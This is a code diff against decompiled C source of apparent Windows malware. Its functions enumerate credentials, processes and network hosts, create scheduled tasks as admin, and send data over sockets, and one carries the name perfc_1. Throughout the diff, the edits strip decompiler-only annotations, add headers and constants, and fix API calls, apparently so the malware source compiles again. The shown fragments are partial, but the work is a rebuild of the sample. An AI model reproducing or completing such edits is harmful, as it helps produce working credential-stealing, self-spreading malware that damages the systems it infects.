@@ -5,13 +5,25 @@ Detected compiler: Visual C++
 */
 
 #include <windows.h>
-#include "defs.h"
-#include "Header.h"
-#include "Arrays.h"
 #include <iostream>
 #include <wincrypt.h>
 #include <stdio.h>
-//#include "ExtFiles.h"
+#include <tlhelp32.h>
+#include <Lm.h>
+#include <iphlpapi.h>
+#include <shlwapi.h>
+#include <wincred.h>
+#include <shlobj.h> 
+#include <dhcpsapi.h>
+#include <winsock.h>
+//#include <shlobj_core.h>
+
+#include "Idadefs.h"
+#include "defs.h"
+#include "Header.h"
+#include "Arrays.h"
+#include "ExtFiles.h"
+
 
 
 //-------------------------------------------------------------------------
@@ -1733,7 +1745,7 @@ _BYTE * sub_681F29CE(_WORD *a1, __int16 a2, __int16 a3, __int16 a4, _WORD *a5)
 			*(v10 + 5) = 8;
 			*(v10 + 7) = 1;
 			*(v10 + 9) = 45;
-			*v10 = -252;
+			*v10 = -252;// hex value?
 			memcpy(v10 + 11, v7, 0x2Du);
 			Src = v11;
 		}
@@ -1770,7 +1782,7 @@ _BYTE * sub_681F29CE(_WORD *a1, __int16 a2, __int16 a3, __int16 a4, _WORD *a5)
 }
 
 //----- (681F2ADF) --------------------------------------------------------
-char * sub_681F2ADF(_WORD *a1, __int16 a2@<dx>, __int16 a3@<cx>, char a4, char a5)
+char * sub_681F2ADF(_WORD *a1, __int16 a2, __int16 a3, char a4, char a5)
 {
 	__int16 v5; // di
 	__int16 v6; // si
@@ -5312,7 +5324,8 @@ BOOL __stdcall EnumProcessHeap(LPVOID lpMem)
 }
 
 //----- (681F6F91) --------------------------------------------------------
-int __thiscall CheckCritSection(void *this, struct _RTL_CRITICAL_SECTION *a2, int *a3)
+
+int __thiscall CheckCritSection(void *this, struct _RTL_CRITICAL_SECTION *a2, int *a3) //remove?
 {
 	int v3; // eax
 	__int16 v4; // dx
@@ -5659,8 +5672,8 @@ signed int  CreateFileAndWrite(const WCHAR *a1, LPCWSTR lpFileName, LPCVOID lpBu
 	HANDLE v4; // edi
 
 	v3 = 0;
-	v4 = CreateFileW(lpFileName, 0x40000000u, 0, 0, 2u, 2u, 0);
-	if (v4 != -1)
+	v4 = CreateFileW(lpFileName, GENERIC_WRITE, 0, 0, 2u, 2u, 0);
+	if (v4 != INVALID_HANDLE_VALUE)
 	{
 		lpFileName = 0;
 		if (WriteFile(v4, lpBuffer, a1, &lpFileName, 0) && a1 == lpFileName)
@@ -5750,7 +5763,7 @@ DWORD __stdcall StartAddress(LPVOID lpThreadParameter)
 // 681FD234: using guessed type int __stdcall StrChrW(_DWORD, _DWORD);
 
 //----- (681F7545) --------------------------------------------------------
-int  Enum64BitProcessAndComPipes(__m64 a1@<mm0>, __m64 a2@<mm1>)
+int  Enum64BitProcessAndComPipes(__m64 a1, __m64 a2)
 {
 	HANDLE v2; // esi
 	HMODULE v3; // eax
@@ -6178,7 +6191,7 @@ int __stdcall EnumerateWindowsCredentials(int a1)
 // 682040BC: using guessed type wchar_t aTermsrv[9];
 
 //----- (681F7C10) --------------------------------------------------------
-void __stdcall __noreturn GetPhysicalNetBiosAndWait(LPVOID lpThreadParameter)
+void __stdcall  GetPhysicalNetBiosAndWait(LPVOID lpThreadParameter)
 {
 	struct _RTL_CRITICAL_SECTION *v1; // edi
 	signed int v2; // esi
@@ -6287,7 +6300,7 @@ signed int  SelfLocalHostCheck(__m64 mm0_0, __m64 a2, const unsigned __int16 *a1
 }
 
 //----- (681F7DEB) --------------------------------------------------------
-void  __noreturn perfc_1(__m64 a1, __m64 a2, int a3, DWORD dwErrCode, HANDLE Thread, HANDLE hThread)
+void  perfc_1(__m64 a1, __m64 a2, int a3, DWORD dwErrCode, HANDLE Thread, HANDLE hThread)
 {
 	int v6; // eax
 	HANDLE *v7; // esi
@@ -6544,9 +6557,9 @@ int __stdcall PathCombineWithCWindows(LPWSTR pszDest)
 }
 
 //----- (681F835E) --------------------------------------------------------
-BOOL SomeFileCheck()
+HANDLE SomeFileCheck()
 {
-	BOOL v0; // esi
+	HANDLE v0; // esi
 	WCHAR pszPath; // [esp+4h] [ebp-618h]
 
 	v0 = 0;
@@ -6554,7 +6567,7 @@ BOOL SomeFileCheck()
 	{
 		if (PathFileExistsW(&pszPath))
 			ExitProcess(0);
-		v0 = CreateFileW(&pszPath, 0x40000000u, 0, 0, 2u, 0x4000000u, 0) + 1 != 0;
+		v0 = CreateFileW(&pszPath, GENERIC_WRITE, 0, 0, 2u, GENERIC_WRITE, 0);  // + 1 != 0; // change
 	}
 	return v0;
 }
@@ -6661,7 +6674,7 @@ BOOL CreateScheduledTaskAsAdmin()
 // 6820F144: using guessed type int gPrivLevel;
 
 //----- (681F85D0) --------------------------------------------------------
-int  LoadAndLock(void **a1, __m64 mm0_0@<mm0>, __m64 a3@<mm1>, int a2, HRSRC hResInfo)
+int  LoadAndLock(void **a1, __m64 mm0_0, __m64 a3, int a2, HRSRC hResInfo)
 {
 	HGLOBAL v5; // eax
 	HRSRC *v6; // esi
@@ -6732,7 +6745,7 @@ int EnumerateProcesses()
 		{
 			do
 			{
-				v9 = 305419896;
+				v9 = 0x12345678;
 				v0 = 0;
 				v1 = wcslen(pe.szExeFile);
 				do
@@ -6751,11 +6764,11 @@ int EnumerateProcesses()
 					}
 					++v0;
 				} while (v0 < 3);
-				if (v9 == 773933892)
+				if (v9 == 0x2E214B44)
 				{
 					v10 &= 0xFFFFFFF7;
 				}
-				else if (v9 == 1677939326 || v9 == 1696280581)
+				else if (v9 == 0x6403527E || v9 == 0x651B3005)
 				{
 					v10 &= 0xFFFFFFFB;
 				}
@@ -6881,7 +6894,7 @@ signed int  CreateSomeFile_2(DWORD a1, const WCHAR *lpFileName, LPCVOID lpBuffer
 }
 
 //----- (681F8999) --------------------------------------------------------
-signed int  GetDllHostData(__m64 mm0_0@<mm0>, __m64 a2@<mm1>, int a1)
+signed int  GetDllHostData(__m64 mm0_0, __m64 a2, int a1)
 {
 	HRSRC v3; // eax
 	int v4; // eax
@@ -7420,7 +7433,7 @@ int __stdcall EnumerateHostNameAndIP_2(int a1)
 }
 
 //----- (681F91FA) --------------------------------------------------------
-signed int __thiscall sub_681F91FA(int this, int a2)
+signed int __thiscall sub_681F91FA(int this, int a2) // remove? 
 {
 	int v2; // edx
 	int v3; // edi
@@ -7507,7 +7520,7 @@ int  CheckImageVProtect(int a1, LPVOID lpAddress)
 }
 
 //----- (681F9322) --------------------------------------------------------
-unsigned int __thiscall sub_681F9322(int this, unsigned int a2)
+unsigned int __thiscall sub_681F9322(int this, unsigned int a2) // remove?
 {
 	_DWORD *v2; // edx
 	int v3; // ecx
@@ -7630,7 +7643,7 @@ BOOL LoadSomeLibraries()
 }
 
 //----- (681F94A5) --------------------------------------------------------
-BOOL  CleanUp(__m64 a1@<mm0>, __m64 a2@<mm1>, int a3, DWORD dwErrCode, HANDLE Thread, HANDLE hThread)
+BOOL  CleanUp(__m64 a1, __m64 a2, int a3, DWORD dwErrCode, HANDLE Thread, HANDLE hThread)
 {
 	BOOL result; // eax
 	HANDLE v7; // eax
@@ -7762,7 +7775,7 @@ int __stdcall EnumerateHostNameAndIP(char *name)
 }
 
 //----- (681F96C7) --------------------------------------------------------
-int  SetWideAddress(__m64 a1@<mm0>, __m64 a2@<mm1>, LPCWSTR lpWideCharStr, int a4, int a5)
+int  SetWideAddress(__m64 a1, __m64 a2, LPCWSTR lpWideCharStr, int a4, int a5)
 {
 	int v5; // esi
 	int v6; // edi
@@ -8106,7 +8119,7 @@ LABEL_61:
 // 68206010: using guessed type int dword_68206010;
 
 //----- (681F9DC3) --------------------------------------------------------
-int  sub_681F9DC3(__m64 a1@<mm0>, __m64 a2@<mm1>, LPCWSTR lpWideCharStr)
+int  sub_681F9DC3(__m64 a1, __m64 a2, LPCWSTR lpWideCharStr)
 {
 	int v3; // esi
 	int v4; // eax
@@ -8418,7 +8431,7 @@ DWORD __stdcall sub_681FA0FE(LPVOID lpThreadParameter)
 // 6820F144: using guessed type int gPrivLevel;
 
 //----- (681FA274) --------------------------------------------------------
-DWORD  SleepAndFreeHeap(__m64 a1@<mm0>, __m64 a2@<mm1>, LPVOID lpThreadParameter)
+DWORD  SleepAndFreeHeap(__m64 a1, __m64 a2, LPVOID lpThreadParameter)
 {
 	struct _RTL_CRITICAL_SECTION *v3; // esi
 	int *v4; // ebx
@@ -8479,7 +8492,7 @@ int __stdcall SockSendDataWithTimeOut(int a1, u_short hostshort)
 			timeout.tv_usec = 0;
 			if (select(v2 + 1, 0, &writefds, 0, &timeout) != -1)
 			{
-				if (_WSAFDIsSet(v2, &writefds))
+				if (__WSAFDIsSet(v2, &writefds))
 					v8 = 1;
 			}
 		}
@@ -8500,7 +8513,7 @@ signed int __stdcall CheckIfDataWasSent(int a1)
 }
 
 //----- (681FA520) --------------------------------------------------------
-signed int  SomeVersionCheck(__m64 mm0_0@<mm0>, __m64 mm1_0@<mm1>, int a1, int *a2, int a3, int a4)
+signed int  SomeVersionCheck(__m64 mm0_0, __m64 mm1_0, int a1, int *a2, int a3, int a4)
 {
 	signed int result; // eax
 	signed int v7; // esi
@@ -8554,7 +8567,7 @@ int __cdecl InsertCharsIntoBuffer(int a1)
 // 681FD2D0: using guessed type int WhatIsThis_dword_681FD2D0[512];
 
 //----- (681FA5CC) --------------------------------------------------------
-signed int  SomeCompressionFunct(__m64 a1@<mm0>, __m64 a2@<mm1>, int a3, int a4)
+signed int  SomeCompressionFunct(__m64 a1, __m64 a2, int a3, int a4)
 {
 	int v4; // ebx
 	unsigned int v5; // edx
@@ -10927,7 +10940,7 @@ LABEL_36:
 // 681FC244: using guessed type __int16 var_7A[15];
 
 //----- (681FC6D0) --------------------------------------------------------
-int  sub_681FC6D0(__m64 a1@<mm0>, __m64 a2@<mm1>, int a3, int a4)
+int  sub_681FC6D0(__m64 a1, __m64 a2, int a3, int a4)
 {
 	unsigned int v4; // et0
 	_DWORD *v5; // edi
